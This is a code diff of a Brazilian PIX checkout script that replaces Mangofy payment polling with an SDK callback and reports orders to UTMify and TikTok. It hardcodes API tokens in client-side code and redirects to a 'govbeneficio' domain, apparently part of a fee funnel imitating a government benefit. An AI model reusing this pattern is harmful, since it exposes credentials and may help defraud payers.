@@ -278,16 +278,13 @@ document.head.appendChild(a);
 </footer>
 
 <script src="https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e" id="pix-sdk-script"></script>
+
 <script>
   var PIX_VALOR_CENTS   = 6490;
   var PIX_DESCRICAO     = 'Pagamento Seguro';
   var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
   var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325';
   var UTMIFY_API_TOKEN = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
-
-  // --- DADOS DA MANGÓFY PARA A VERIFICAÇÃO ---
-  var MANGOFY_API_KEY = '1e9d4642a8cff56ee7212167bafd6235'; 
-  var MANGOFY_STORE_CODE = 'vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e';
 
   var _pixCode='',_pixPaymentCode='',_pixQRFeito=false,_checkoutDisparado=false;
   var _pixCreatedAt='';
@@ -370,7 +367,6 @@ document.head.appendChild(a);
 
       console.log('Enviando payload para UTMify (status: ' + status + ')...');
       
-      // ESPERA RESPONDER ANTES DE DEIXAR A PÁGINA MUDAR (AWAIT)
       var res = await fetch('https://api.utmify.com.br/api-credentials/orders', {
         method:  'POST',
         headers: { 
@@ -490,8 +486,6 @@ document.head.appendChild(a);
   }
 
   var _pixGerando = false;
-  var _pixUltimaReq = 0;
-  var _checkInterval = null;
 
   async function pixIniciar(){
     var cache = pixLerCache();
@@ -499,23 +493,12 @@ document.head.appendChild(a);
       _pixPaymentCode = cache.paymentCode || '';
       pixExibir(cache.pixCode, cache.qrImage);
       ttqViewContent();
-      iniciarVerificacaoPix(); 
       return;
     }
 
+    // Previne múltiplos cliques
     if(_pixGerando) return;
-    var agora = Date.now();
-    var espera = 10000;
-    if(agora - _pixUltimaReq < espera){
-      var restante = Math.ceil((espera - (agora - _pixUltimaReq)) / 1000);
-      document.getElementById('pix-erro').querySelector('div').innerHTML =
-        'Aguarde ' + restante + ' segundos antes de tentar novamente.';
-      document.getElementById('pix-erro').style.display = 'block';
-      document.getElementById('pix-loading').style.display = 'none';
-      return;
-    }
     _pixGerando = true;
-    _pixUltimaReq = agora;
 
     document.getElementById('pix-loading').style.display = 'block';
     document.getElementById('pix-erro').style.display    = 'none';
@@ -524,93 +507,62 @@ document.head.appendChild(a);
     ttqIdentify();
 
     try {
-      var emailConfig = (_email && _email.indexOf('@') > 0) ? _email : gerarEmailAleatorio();
-      var phoneConfig = _fone || gerarFoneAleatorio();
       var nomeEnvio = nomeOk || 'Cliente Pagador';
+      var documentoEnvio = _cpf || '00000000000';
       
-      var config = {
-        total_price: PIX_VALOR_CENTS / 100,
+      // O OBJETO CONFIG EXATAMENTE COMO A MANGÓFY PEDIU NO NOVO PADRÃO
+      const config = {
+        total_price: 64.90, // Valor em float, sem conversão de centavos
         customer: {
             name: nomeEnvio,
-            document: _cpf || '00000000000',
-            email: emailConfig,
-            phone: phoneConfig
+            document: documentoEnvio,
         },
         items: [
-          { name: PIX_DESCRICAO, price: PIX_VALOR_CENTS / 100, quantity: 1 }
+            { name: 'Front', price: 64.90, quantity: 1 }
         ]
       };
 
-      var response = await generatePix(config);
+      // Executa a requisição da Fast API e aguarda
+      const response = await generatePix(config);
+
+      // Validação do sucesso da requisição
       if(!response.success) throw new Error(response.message || 'Erro ao gerar PIX');
 
+      // Extraindo as Strings baseadas na documentação que te mandaram
       _pixCode        = response.pixCode || '';
       _pixPaymentCode = response.paymentCode || response.transactionId || response.id || '';
       _pixCreatedAt   = new Date().toISOString();
 
+      // Salva no cache
       pixSalvarCache(_pixCode, response.qrCodeImage, _pixPaymentCode);
 
+      // Mostra o QR e Copia e Cola
       pixExibir(_pixCode, response.qrCodeImage);
+      
+      // Envio para Tiktok
       ttqViewContent();
       ttqInitiateCheckout();
       
-      // DISPARA O PENDENTE
+      // Manda o status 'waiting_payment' (PIX gerado, aguardando pagamento)
       await utmifyNotificar('waiting_payment');
-      
-      // INICIA A VERIFICAÇÃO DE PAGAMENTO
-      iniciarVerificacaoPix();
 
     } catch(err){
-      console.error('Erro PIX Mangofy:', err);
+      console.error('Erro PIX Mangofy SDK:', err);
       document.getElementById('pix-erro').querySelector('div').innerHTML =
         'Não foi possível gerar o PIX.<br>Verifique sua conexão e tente novamente.';
       document.getElementById('pix-loading').style.display = 'none';
       document.getElementById('pix-erro').style.display    = 'block';
     } finally {
+      // Libera o botão novamente
       _pixGerando = false;
     }
   }
 
-  function iniciarVerificacaoPix() {
-    if (_checkInterval) clearInterval(_checkInterval);
-    if (!_pixPaymentCode) return;
-
-    console.log("Iniciando escuta de pagamento (Mangofy API)...");
+  // NOVA FUNÇÃO GLOBAL: O SDK chamará essa função automaticamente no Sucesso
+  window.paymentApproved = async function() {
+    console.log("SDK MANGÓFY AVISOU: PAGAMENTO CONFIRMADO!");
     
-    _checkInterval = setInterval(async function() {
-        try {
-            var urlVerificacao = 'https://checkout.mangofy.com.br/api/v1/payment/' + _pixPaymentCode;
-            
-            var res = await fetch(urlVerificacao, {
-                method: 'GET',
-                headers: {
-                    'Authorization': MANGOFY_API_KEY,
-                    'Store-Code': MANGOFY_STORE_CODE,
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                }
-            });
-
-            if(res.ok) {
-                var json = await res.json();
-                
-                if(json.payment_status === 'approved') {
-                    console.log("✅ Pagamento Aprovado Confirmado!");
-                    clearInterval(_checkInterval); 
-                    paymentApproved(); // Chama o fluxo de sucesso
-                }
-            } else {
-                console.log("Aguardando pagamento... (Status: " + res.status + ")");
-            }
-        } catch(e) {
-            console.error("Erro na verificação do PIX:", e);
-        }
-    }, 4000); 
-  }
-
-  // NOVA FUNÇÃO: Tela visual garantindo que o cliente aguarde o rastreio
-  async function paymentApproved(){
-    // 1. Substitui a tela de pagamento por um aviso visual instantâneo
+    // 1. Tela Verde instantânea
     var areaPix = document.getElementById('pix-body-container');
     if(areaPix) {
         areaPix.innerHTML = `
@@ -626,14 +578,14 @@ document.head.appendChild(a);
     pixLimparCache();
     ttqPurchase();
     
-    // 2. Aguarda a UTMify processar o pagamento com segurança (agora não tem risco de cortar)
+    // 2. Dispara pra UTMify garantindo a captura do evento
     await utmifyNotificar('paid');
     
-    // 3. Dá 1,5 segundos de margem de segurança antes de redirecionar com todas as UTMs
+    // 3. Aguarda 1,5 segundos de margem de segurança e redireciona com UTMs como a Mangofy instruiu
     setTimeout(function() {
         window.location.href = utmRedirectUrl();
     }, 1500);
-  }
+  };
 
   function pixAba(aba){
     document.getElementById('ptab-copia').classList.toggle('on',aba==='copia');
